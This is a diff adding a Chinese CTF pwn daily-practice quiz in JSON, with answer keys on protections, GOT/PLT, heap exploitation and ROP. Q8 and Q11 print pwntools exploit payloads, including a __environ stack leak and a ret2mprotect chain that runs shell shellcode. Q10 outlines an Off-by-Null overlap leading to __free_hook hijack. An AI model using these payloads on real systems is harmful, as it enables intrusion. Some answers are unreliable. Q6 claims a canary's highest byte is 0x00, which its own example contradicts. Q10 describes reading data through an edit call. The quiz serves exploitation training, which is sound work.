@@ -1,0 +1,131 @@
+{
+  "date": "2026-11-25",
+  "title": "Pwn 每日一练 · Day 009",
+  "topics": ["保护机制", "pwntools", "IDA逆向", "GOT/PLT", "one_gadget", "格式化字符串", "堆利用", "libc地址泄露", "GDB调试", "栈溢出"],
+  "estimatedMinutes": 30,
+  "questions": [
+    {
+      "id": "q1",
+      "type": "choice",
+      "difficulty": "basic",
+      "topic": "保护机制",
+      "question": "关于 PIE（位置无关可执行文件）保护机制，下列说法正确的是？",
+      "options": [
+        "PIE 开启后，程序内各函数之间的相对偏移每次运行都会随机变化",
+        "PIE 是编译期选项，开启后程序代码段基址支持运行时随机化，需先泄露一个程序内地址才能计算程序基址",
+        "PIE 与系统 ASLR 完全等价，开启其中一个即可",
+        "checksec 中 PIE 列显示 Enabled 意味着 libc 基址也被固定不随机化"
+      ],
+      "answer": 1,
+      "explanation": "PIE 是编译时加入的选项（-fPIE / -pie），使程序代码段（.text/.plt/.got 等）在加载时整体平移随机化；但程序内所有符号的相对偏移固定不变，因此泄露任意一个程序内地址（如 main 的返回地址、某个函数地址），减去其固定偏移即得程序基址，基址加偏移可算出所有 PLT/GOT 地址。A 错误：相对偏移固定；C 错误：PIE 是编译期选项、控制代码段，ASLR 是内核运行时机制、控制栈/堆/libc/mmap，两者独立，需配合；D 错误：PIE 只控制程序自身，libc 由 ASLR 随机化。本题与 11-21 的 ASLR 题互补：11-21 问 ASLR 随机化范围，本题聚焦 PIE 的本质与程序基址泄露方法。"
+    },
+    {
+      "id": "q2",
+      "type": "fill",
+      "difficulty": "basic",
+      "topic": "pwntools",
+      "question": "pwntools 中，本地启动目标程序进行调试使用 ______('./pwn')；连接远程题目使用 ______('host', port)；利用完成拿到 shell 后，进入交互式终端手动输入命令使用 ______() 方法。",
+      "answer": ["process;remote;interactive", "process，remote，interactive"],
+      "explanation": "process('./pwn') 在本地启动程序并返回 tube 对象，配合 gdb.attach 可动态调试；remote('host', port) 连接远程 CTF 服务；io.interactive() 把控制权交给用户，直接在终端与拿到的 shell 交互，是 getshell 后的标准收尾。实战中常写：if args['REMOTE']: io = remote(host, port) else: io = process('./pwn')，实现本地调试与远程打靶一键切换。11-21/24 已考 recv/send 系方法，本题考连接与交互入口，角度不同。"
+    },
+    {
+      "id": "q3",
+      "type": "fill",
+      "difficulty": "basic",
+      "topic": "IDA逆向",
+      "question": "在 IDA Pro 中，跳转到指定地址（如 0x401234）按 ______ 键；对函数名、变量名进行重命名按 ______ 键；在反汇编视图与已生成的 C 伪代码视图之间切换按 ______ 键。",
+      "answer": ["G;N;Tab", "G，N，Tab"],
+      "explanation": "G 键（Jump to address）弹出地址输入框并跳转，常用于根据泄露地址定位函数；N 键重命名符号，逆向时把 sub_xxx 改成有意义的名字（如 vuln、menu）能大幅提升可读性；Tab 键在汇编视图与 F5 反编译出的伪代码视图间切换，分析时交替使用——汇编看寄存器与指令细节，伪代码看整体逻辑。前面试卷已考 C（数据转代码）、X（交叉引用）、F5（反编译）、Shift+F12（字符串），本题补全 G/N/Tab 三个常用操作键。"
+    },
+    {
+      "id": "q4",
+      "type": "choice",
+      "difficulty": "basic",
+      "topic": "GOT/PLT",
+      "question": "关于动态链接程序的 PLT 与 GOT，下列说法正确的是？",
+      "options": [
+        "PLT 中存放的是 libc 函数的真实运行时地址",
+        "程序第一次调用某函数时，经 PLT 跳板查 GOT 表项，触发延迟绑定解析出真实地址并写回 GOT，后续调用直接跳转",
+        "GOT 表项在程序启动时就已全部填充为 libc 函数真实地址（任何 RELRO 等级下都是如此）",
+        ".got 和 .got.plt 是同一个节的两个名称"
+      ],
+      "answer": 1,
+      "explanation": "PLT 是一段跳板代码，每次调用函数都经 jmp *GOT[n] 间接跳转；GOT 表项存放函数真实地址。延迟绑定（Partial RELRO 默认）下，第一次调用某函数时该 GOT 表项指向 PLT 内的解析桩，解析出真实地址后回写 GOT，后续调用直接命中。Full RELRO（BIND_NOW）在加载时一次性完成所有绑定。A 错误：PLT 是代码不是地址；C 错误：Partial RELRO 下首次调用前未绑定；D 错误：.got（全局变量重定位）与 .got.plt（函数重定位）是两个不同节，Full RELRO 下常被合并。"
+    },
+    {
+      "id": "q5",
+      "type": "choice",
+      "difficulty": "basic",
+      "topic": "one_gadget",
+      "question": "关于 CTF-Pwn 常用工具 one_gadget，下列说法正确的是？",
+      "options": [
+        "one_gadget 用于在程序二进制中查找 ROP gadget",
+        "one_gadget 用于在 libc.so.6 中查找无需传参、满足一定约束即可直接执行 execve('/bin/sh', NULL, NULL) 的 gadget 地址",
+        "one_gadget 找到的 gadget 可以无条件直接 getshell，无需满足任何约束",
+        "one_gadget 只能用于 32 位 libc"
+      ],
+      "answer": 1,
+      "explanation": "one_gadget 扫描 libc.so.6，找出布置好特定寄存器/栈约束后即可直接 getshell 的指令序列（通常是 libc 内部调用 execve 的路径），输出若干候选地址及各自约束（如 [rsp+0x70]==NULL、rax==NULL 等）。A 错：ROPgadget 查程序 gadget，one_gadget 查 libc；C 错：必须满足约束，否则崩溃，需在 GDB 中断点验证；D 错：同时支持 32/64 位。用法：one_gadget ./libc.so.6，远程泄露 libc 后基址加偏移即可直接跳转，比构造 system 链更简洁，但约束不满足时需改用 ROP 调用 system。"
+    },
+    {
+      "id": "q6",
+      "type": "fill",
+      "difficulty": "medium",
+      "topic": "格式化字符串",
+      "question": "利用格式化字符串漏洞泄露栈上 Canary 时，64 位 Canary 的特征是最高字节为 0x00、最低字节固定为 ______；先用若干 %p 定位到 Canary 落在第 N 个参数位置后，可用 ______（格式说明符）将其以 16 进制一次性打印出来，再用 int(leak, 16) 还原。",
+      "answer": ["0x00;%N$p", "0x00，%N$p", "\\x00;%N$p"],
+      "explanation": "64 位 Canary 形如 0x00xxxxxxxxxxxxxx——最高字节 0x00、最低字节固定 0x00（防止字符串函数溢出时顺带覆盖 Canary），在 %p 的连续输出中很容易识别（两头带 00）。定位其参数位置 N 后用 %N$p 直接打印该参数值，接收到的如 0xabcdef1234567800 用 int(...,16) 还原，构造 payload 时填回原位即可绕过校验。注意：若 Canary 中间字节含 0x00，%p 仍能完整输出（按指针整体打印，不被截断），比 %s 更适合泄露这类非字符串的二进制数据。前面试卷已考格式化字符串的任意读/任意写，本题聚焦'泄露 Canary'这一具体实战用途，角度不同。"
+    },
+    {
+      "id": "q7",
+      "type": "choice",
+      "difficulty": "medium",
+      "topic": "堆利用",
+      "question": "关于 glibc 堆中的 UAF（Use-After-Free）漏洞，下列说法错误的是？",
+      "options": [
+        "UAF 指 free 一块 chunk 后，指向它的指针未被置空，程序后续仍可通过该指针读写已释放的内存",
+        "利用 UAF 可读取已 free chunk 的 fd/bk 字段：在 tcache/fastbin 中泄露 heap 地址，在 unsorted bin 中泄露 libc 地址",
+        "利用 UAF 可修改已 free chunk 的 fd 指针，实现 tcache poisoning（tcache 投毒），把后续 malloc 分配指向任意地址",
+        "只要 free 后指针被置空，就一定不存在 UAF，因此任何情况下都无法再利用该漏洞"
+      ],
+      "answer": 3,
+      "explanation": "UAF 的三要素：free 后指针未置空 + 程序后续仍能通过该指针访问。A 描述正确。B：tcache/fastbin 中 free chunk 的 fd 指向堆内地址，可泄露 heap；unsorted bin 中 fd/bk 指向 libc 的 main_arena，可泄露 libc——UAF 提供的读原语即可获取。C：UAF 提供的写原语修改 free chunk 的 fd，让 tcache 链表指向目标地址（如 __free_hook），是 tcache poisoning 的经典触发方式。D 错误：指针置空确实消除了通过原指针的直接 UAF，但若程序还存在堆溢出、double free、格式化字符串等其他原语，仍可间接操作已释放的 chunk；'置空'只防住了原指针别名，不代表已释放内存彻底不可达。"
+    },
+    {
+      "id": "q8",
+      "type": "qa",
+      "difficulty": "medium",
+      "topic": "libc地址泄露",
+      "question": "某些题目泄露 libc 后仍需要一个栈地址（例如构造 SROP 的 sigreturn frame，或精确定位栈上返回地址）。请说明如何利用 libc 中的全局符号 __environ 泄露当前进程的栈地址，并写出关键代码思路（提示：__environ 指向的内容位于栈上）。",
+      "answer": "原理：__environ 是 libc 中的全局指针变量，其值指向进程的环境变量数组 char *environ[]，而该数组本身位于用户栈的高地址区域。因此 __environ 变量中存储的内容天然就是一个栈地址——泄露 *__environ（即 __environ 处存放的 8 字节值）即可得到栈上某地址，栈是页对齐的，结合固定偏移可推算栈基址。\n\n关键步骤：\n1. 先用常规手段（如 GOT 泄露）泄露 libc 基址 libc_base。\n2. 计算 __environ 变量的运行时地址：environ_addr = libc_base + libc.sym['__environ']（pwntools 可直接取偏移）。\n3. 用一个输出原语精确读取 environ_addr 处的 8 字节——即栈地址：\n   - 推荐用 write(1, environ_addr, 8)，因为栈地址通常含 0x00 字节，puts 遇 0 会截断导致泄露不完整。\n   - 若只有栈溢出 + ROP，构造：pop_rdi(1) + pop_rsi(environ_addr) + pop_rdx(8) + write@plt + main。\n4. 解析：leak = io.recv(8); stack_addr = u64(leak.ljust(8, b'\\x00'))。\n\n代码示例：\n```python\nenviron_addr = libc_base + libc.sym['__environ']\npayload = flat(\n    b'A' * offset,\n    p64(pop_rdi), p64(1),\n    p64(pop_rsi), p64(environ_addr),\n    p64(pop_rdx), p64(8),\n    p64(elf.plt['write']),\n    p64(main_addr)\n)\nio.sendline(payload)\nstack_leak = u64(io.recv(8).ljust(8, b'\\x00'))\nlog.success('stack leak = ' + hex(stack_leak))\n```\n\n利用：栈上各结构相对环境变量区的偏移在同一程序内固定，用 stack_leak ± 固定偏移即可定位返回地址、局部变量等，用于 SROP 布置 frame 或精确覆盖。具体偏移需在 GDB 中对比确认（看 environ 数组与目标变量的地址差）。\n\n注意：libc.sym['__environ'] 在不同版本偏移不同，但同一版本固定；泄露到的地址是环境变量区地址，不是栈顶，需换算。",
+      "explanation": "__environ 泄露是'已泄露 libc 但还需要栈地址'场景的标准技巧，核心在于 environ 数组本身位于栈上，所以 __environ 这个指针变量里存的值天然就是栈地址。它与 GOT 泄露互补：GOT 泄露给 libc 基址，__environ 泄露给栈基址，两者配合可解决需要精确栈地址的利用（SROP 帧布置、栈迁移目标定位、精确定位返回地址等）。选择 write 而非 puts 是因为栈地址通常含 0x00 字节，puts 遇 0 截断会让泄露残缺；write 按指定长度输出最可靠。"
+    },
+    {
+      "id": "q9",
+      "type": "qa",
+      "difficulty": "medium",
+      "topic": "GDB调试",
+      "question": "调试复杂 ROP 链时，程序常在某个 gadget 处崩溃，此时正向调试已无法看到崩溃前的状态。请说明 GDB 反向调试（reverse debugging）的开启方法、常用命令及适用场景。",
+      "answer": "GDB 反向调试允许程序'倒着走'，查看某条指令执行前的寄存器/内存状态，对定位 ROP 链在哪个 gadget 出错、某块内存何时被改写非常有用。\n\n开启方法：\n1. 在程序运行前开启执行记录：record full（或 target record-full），让 GDB 记录每一步的状态变更；较新 GDB 可用 record btrace（基于硬件分支跟踪，开销更小）。\n2. 开启后正常运行（run / continue）到目标位置。\n\n常用反向命令：\n- reverse-stepi（rsi）：反向单步一条汇编指令，遇到 call 会进入。\n- reverse-nexti（rni）：反向单步一条汇编指令，遇到 call 不进入。\n- reverse-step（rs）：反向执行一行源码，进入函数。\n- reverse-next（rn）：反向执行一行源码，不进入函数。\n- reverse-continue（rc）：反向运行到上一个断点或观察点。\n\n适用场景：\n1. ROP 链调试：链在某处崩溃后，用 reverse-stepi 一步步退回到出错 gadget 执行之前，检查此时寄存器和栈是否符合预期，快速定位是哪个 gadget 破坏了状态。\n2. 定位内存被改写的源头：对某地址设观察点 watch *0xaddr，再用 reverse-continue 倒回到该内存上一次被改写的位置，直接找到'是谁改了它'（常用于排查 Canary 被覆盖、GOT 被篡改等破坏性操作）。\n3. 分析某值何时被修改、从何处被修改，正向调试难以回溯的场景。\n\n注意事项：\n- record full 会显著拖慢执行且记录缓冲区有上限，长时间运行可能耗尽内存，调试时尽量在接近目标处才开启。\n- 反向调试要求程序行为可逆，某些系统调用/信号可能影响可靠性；复杂场景可用 rr（Record and Replay）框架替代，效率更高。\n- 手动回退的笨办法：p $rip 记下当前地址，在更早处下断点后 restart 重新运行到该点，配合正向单步对比。",
+      "explanation": "正向调试只能看到'之后'，反向调试能看到'之前'，是分析'某状态何时被破坏'的利器。ROP 链崩溃时程序往往已 abort，正向无法回溯，reverse-stepi 能一步步退回去检查每个 gadget 执行前后的寄存器与栈。record full 是标准开启方式，watch + reverse-continue 的组合定位内存改写源头效率极高。前面试卷已考正向单步命令（ni/si/n/s），本题补充反向调试能力，形成完整的 GDB 调试工具箱。"
+    },
+    {
+      "id": "q10",
+      "type": "qa",
+      "difficulty": "hard",
+      "topic": "堆利用",
+      "question": "某 64 位菜单题（glibc 2.31，无 safe-linking）提供 malloc/free/edit，存在 Off-by-Null 漏洞：edit 时可向 chunk 写入比申请大小多 1 字节，且该字节恰好覆盖相邻 chunk 的 size 字段最低字节（只能把 PREV_INUSE 位清 0，不能改 size 主体）。free 后指针会被置空（无 UAF、无 double free）。请说明如何利用 Off-by-Null 完成 chunk 重叠并泄露 libc，给出关键步骤与要点。",
+      "answer": "Off-by-Null（一字节空字节溢出）只能把相邻 chunk size 的最低位（PREV_INUSE 位，bit0）清 0，使 free 该 chunk 时误以为前一个 chunk 空闲，从而触发前向合并（对前一个 chunk 做 unlink），制造 chunk 重叠。它不需要 UAF，只要能伪造 prev_size 并清标志位即可。\n\n前置布局（防止与 top chunk 合并）：\n申请 A(0x100 → size 0x111)、B(0x100 → 0x111)、C(0x100 → 0x111)，再加 D(0x20) 作为隔离 chunk，防止 C 被 free 时与 top chunk 合并。先连续 free 7 个 0x110 大小的 chunk 把该大小类的 tcache 填满（tcache 每类最多 7 个），使后续 free 走 unsorted bin 路径（fastbin/tcache 的 fd 指向堆内，无法泄露 libc）。\n\n关键步骤：\n1. free(A) → A 进入 unsorted bin（tcache 已满），其 fd/bk 指向 libc 的 main_arena。\n2. malloc 拿回 A（记为 A'，从 unsorted bin 取出，用户仍持有 A' 的指针）。通过 edit(A') 在 A 的数据区末尾伪造 B 的 prev_size = A 的大小 0x110——这个位置物理上紧邻 B 的 prev_size 字段，使 B 以为'前一个空闲 chunk 从 A 起始'。\n3. 再次 edit，利用 Off-by-Null 把 B 的 size 最低字节从 0x111 改为 0x110（清掉 PREV_INUSE 位），表示 B 认为其前一个 chunk 处于空闲态。\n4. free(B) → glibc 检查到 B 的 PREV_INUSE=0，于是把'前一个 chunk'（从 B - prev_size = A 起始）合并进来，对 A 区域执行 unlink 并归入 unsorted bin。但用户指针 A' 仍指向这片内存 → A' 与 unsorted bin 中的 chunk 物理重叠。\n5. 泄露 libc：通过 edit(A') 读取重叠区域内 unsorted bin chunk 的 fd/bk 字段（A' 的数据区覆盖到了该处），得到 main_arena 相关地址；libc_base = leak - libc.sym['main_arena']（或对应固定偏移）。\n6. 后续 getshell：利用重叠指针 A' 修改 unsorted/tcache 中 chunk 的 fd，做 tcache poisoning 指向 __free_hook，写入 system，再 free 一个内容为 '/bin/sh' 的 chunk 即 getshell。\n\n要点：\n- Off-by-Null 只能写 1 个 0x00 字节，因此只能清 PREV_INUSE 位，不能直接改大 size——这是它与常规堆溢出的本质区别，手法受限但更隐蔽。\n- 伪造的 prev_size 必须精确等于前面要合并 chunk 的大小（16 字节对齐），否则合并时 size 校验报错。\n- 必须先填满对应大小类的 tcache，free 才会进入 unsorted bin 以泄露 libc；必须留隔离 chunk D 防止与 top chunk 合并。\n- GDB 中用 heap 命令查看 chunk 布局，确认重叠是否成功。",
+      "explanation": "Off-by-Null 是比常规堆溢出更'精细'的漏洞——只能写 1 个 0 字节，核心是清掉 PREV_INUSE 位伪造前 chunk 空闲，触发 glibc 的前向合并（unlink）制造重叠。它与 tcache poisoning（需 UAF）、unlink（需全局指针数组存 chunk 地址）互补：Off-by-Null 不需要 UAF，只要能伪造 prev_size 并清标志位即可。重叠后获得'同一内存两个视角'，配合让 free 进入 unsorted bin 泄露 libc 是标准后续。难点在于 prev_size 必须精确、要先填满 tcache、要留隔离 chunk——三处任一出错都会触发 malloc 校验报错。理解 glibc free 时根据 PREV_INUSE 决定是否前向合并的逻辑，是掌握 Off-by-Null 的关键。"
+    },
+    {
+      "id": "q11",
+      "type": "qa",
+      "difficulty": "hard",
+      "topic": "栈溢出",
+      "question": "某 64 位程序 checksec：NX 开启、Canary 未开启、PIE 未开启、Partial RELRO。存在栈溢出 read(0, buf, 0x400)，buf 距 rbp 为 0x20。程序只导入了 read 和 write，没有 system/execve，程序内也没有 '/bin/sh' 字符串，但可找到 pop rax/rdi/rsi/rdx;ret 等 gadget 和 syscall 指令，还有一段可写的 .bss 段 bss_buf。请设计 getshell 方案（提示：用 mprotect 系统调用把某页改为可执行，再跳 shellcode），给出关键 ROP 链结构与各阶段目的。",
+      "answer": "方案：ret2mprotect —— 用 ROP + ret2syscall 调用 mprotect，把存放 shellcode 的页（.bss 所在页）从 RW 改为 RWX 可执行，再把控制流跳到该页执行 shellcode getshell。它不直接执行栈（绕过 NX 的限制），也不依赖 libc 中的 system/execve（mprotect 是系统调用，用 syscall 触发）。\n\n64 位 mprotect 系统调用约定：调用号 rax = 10 (0xa)；参数 rdi = 页起始地址（必须页对齐）、rsi = 长度（通常 0x1000）、rdx = 权限（PROT_READ|PROT_WRITE|PROT_EXEC = 1|2|4 = 7）；syscall 触发。\n\nStage 1：把 shellcode 读入 .bss + 调用 mprotect 改权限 + 跳过去执行\n\n```python\nfrom pwn import *\ncontext(os='linux', arch='amd64')\n\nelf = ELF('./pwn')\nbss_buf = 0x404000          # 示例 .bss 地址（PIE 未开，地址固定）\npage = bss_buf & ~0xfff     # 页对齐：mprotect 要求起始地址低 12 位为 0\n\nshellcode = asm(shellcraft.amd64.linux.sh())\n\noffset = 0x20               # buf 到 saved rbp 的距离\npayload = flat(\n    b'A' * offset,                      # 填充到 saved rbp\n    p64(0),                             # saved rbp\n    # 1) read(0, bss_buf, 0x100) 把 shellcode 读入 .bss\n    p64(pop_rdi_ret), p64(0),\n    p64(pop_rsi_ret), p64(bss_buf),\n    p64(pop_rdx_ret), p64(0x100),\n    p64(elf.plt['read']),\n    # 2) mprotect(page, 0x1000, 7) 把 .bss 所在页改为可执行\n    p64(pop_rax_ret), p64(10),          # rax = mprotect 调用号\n    p64(pop_rdi_ret), p64(page),        # rdi = 页起始（页对齐）\n    p64(pop_rsi_ret), p64(0x1000),      # rsi = 长度\n    p64(pop_rdx_ret), p64(7),           # rdx = RWX\n    p64(syscall_ret),                   # 触发 mprotect\n    # 3) 跳到 bss_buf 执行 shellcode\n    p64(bss_buf)\n)\n\nio.send(payload)\nio.send(shellcode)      # 供 Stage 1 的 read 读入\nio.interactive()\n```\n\n各阶段目的：\n- read：把 shellcode 预先写入 .bss（NX 开启时 .bss 不可执行，此时还不能直接跳）。\n- mprotect：把 .bss 所在页的权限合法地改为 RWX，使 shellcode 可执行。\n- ret 到 bss_buf：CPU 跳到已变为可执行的页，执行 shellcode → execve('/bin/sh') getshell。\n\n关键要点：\n- mprotect 的起始地址必须页对齐（低 12 位为 0），用 bss_buf & ~0xfff 计算；长度给 0x1000 覆盖 bss_buf 所在页即可。\n- 必须确认程序内有 syscall 指令（ROPgadget --binary ./pwn | grep ': syscall'）和 pop rax; ret；若没有 syscall 但导入了 mprotect，可改用 mprotect@plt（但需先泄露 libc 基址）。\n- shellcode 用 pwntools 的 shellcraft.amd64.linux.sh() 生成，自带 '/bin/sh' 字符串，无需程序提供。\n- 若找不到 pop rdx; ret，可用 ret2csu 的 r13→rdx 路径替代（借助 __libc_csu_init 的通用 gadget）。\n- 调用 read/mprotect 前注意 16 字节栈对齐，必要时在函数地址前插一个 ret gadget 微调，避免 movaps 崩溃。",
+      "explanation": "ret2mprotect 是 NX 开启、无 system/execve、但凑得齐 pop 寄存器 + syscall gadget 时的经典 getshell 路线。它不'绕过'NX（不执行栈上数据），而是合法地通过 mprotect 系统调用把攻击者可控的页（.bss / 堆 / mmap 区）改成可执行，再跳过去执行 shellcode。与 ret2libc（需泄露 libc）、ret2syscall execve（需在内存中布置 '/bin/sh' 字符串）相比，ret2mprotect 只需一个可写内存区 + syscall gadget，不依赖 libc 版本。核心考点是页对齐（mprotect 强制要求）和权限值 0x7（RWX），以及确认程序内存在 syscall 指令。本题 PIE 未开简化了所有地址计算；若 PIE 开启，需先泄露程序基址再算 bss_buf 和各 gadget 地址。"
+    }
+  ]
+}
